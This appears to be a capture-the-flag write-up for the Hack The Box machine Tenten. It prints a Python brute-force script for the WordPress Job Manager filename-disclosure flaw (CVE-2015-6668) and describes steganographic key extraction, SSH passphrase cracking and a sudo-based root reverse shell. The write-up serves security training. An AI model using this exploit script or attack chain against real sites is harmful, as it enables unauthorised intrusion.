---
title:     "Hack The Box - Tenten"
tags: [linux,medium,sudo,wordpress,plugin]
---

![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-tenten/1.png)

We are going to pwn Tenten from Hack The Box.

Link : <https://www.hackthebox.eu/home/machines/profile/8>


Like always begin with our Nmap Scan.

## Nmap Scan Results:

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http


PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ec:f7:9d:38:0c:47:6f:f0:13:0f:b9:3b:d4:d6:e3:11 (RSA)
|   256 cc:fe:2d:e2:7f:ef:4d:41:ae:39:0e:91:ed:7e:9d:e7 (ECDSA)
|_  256 8d:b5:83:18:c0:7c:5d:3d:38:df:4b:e1:a4:82:8a:07 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-generator: WordPress 4.7.3
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Job Portal &#8211; Just another WordPress site
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 4.11 (92%), Linux 3.12 (92%), Linux 3.13 (92%), Linux 3.13 or 4.2 (92%), Linux 3.16 (92%), Linux 3.16 - 4.6 (92%), Linux 3.18 (92%), Linux 3.2 - 4.9 (92%), Linux 3.8 - 3.11 (92%), Linux 4.2 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## HTTP

![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-tenten/2.png)<br/>
Since its a wordpress site we can enumerate using ``wpscan`` to get see if there is any users and plugins available<br/>
Found a Plugin called ``job-manager``
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-tenten/3.png)

Found an User  ``takis``<br/>
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-tenten/4.png)

I started searching for any exploits available for that plugin and found

>https://vagmour.eu/cve-2015-6668-cv-filename-disclosure-on-job-manager-wordpress-plugin/

From the blog I found there is a directory ``/index.php/jobs/apply/@@/``<br/>
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-tenten/5.png)

As we can see there is an ID and when I changed to some random numbers and job title has been changed.<br/>
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-tenten/6.png)

So I started trying some random number to check if there is anything useful for us.<br/>
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-tenten/7.png)<br/>
Found this ``HackerAccessGranted`` from the ID 13 , Which looks suspecious.

In WordPress there is directory structure for the uploaded files is recognized by ``/wp-content/uploads/%year%/%month%/%filename%``
 
There is a python script given in the above Link ``CVE-2015-6668`` which helps to find the exact directory of the file location by bruteforcing.

I did some modifications on the script 

> - Changed the year range to the year of the box released.
> - Changed the extensions.

```
import requests

print """  
CVE-2015-6668  
Title: CV filename disclosure on Job-Manager WP Plugin  
Author: Evangelos Mourikis  
Blog: https://vagmour.eu  
Plugin URL: http://www.wp-jobmanager.com  
Versions: <=0.7.25  
"""  
website = raw_input('Enter a vulnerable website: ')  
filename = raw_input('Enter a file name: ')

filename2 = filename.replace(" ", "-")

for year in range(2017,2018):  
    for i in range(1,13):
        for extension in {'jpg','jpeg','png','pdf','txt'}:
            URL = website + "/wp-content/uploads/" + str(year) + "/" + "{:02}".format(i) + "/" + filename2 + "." + extension
            req = requests.get(URL)
            if req.status_code==200:
                print "[+] URL of CV found! " + URL
```

![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-tenten/8.png)<br/>
It found the exact location of the file ``HackerAccessGranted``

Opened the link and its an image.<br/>
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-tenten/9.png)

This is the image we found!!<br/>
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-tenten/10.1.jpg)

Downloaded it to my machine to check with ``steghide`` to see if there is anything hidden.

> steghide - a steganography program

![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-tenten/10.png)

Got SSH Private key so lets use ssh2john before cracking it with john<br/>
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-tenten/11.png)<br/>
I saved the output as ``ssh2john`` and I gave it to ``john`` to crack the password.<br/>
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-tenten/12.png)<br/>

So the password is ``superpassword``. We already know there is an user named ``takis``<br/>
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-tenten/13.png)

## Privilege Escalation:

Like always I started with ``sudo -l``<br/>
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-tenten/14.png)

Looks like we can run ``fuckin`` as root without password.<br/>
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-tenten/15.png)<br/>
``fuckin`` seems to be a script that contains arguments and that we need to pass on.

Lets try with ``whoami``

Now its time to get reverse shell as root using the ``fuckin``<br/>
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-tenten/16.png)

Started my listener<br/>
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-tenten/17.png)

I got Root!


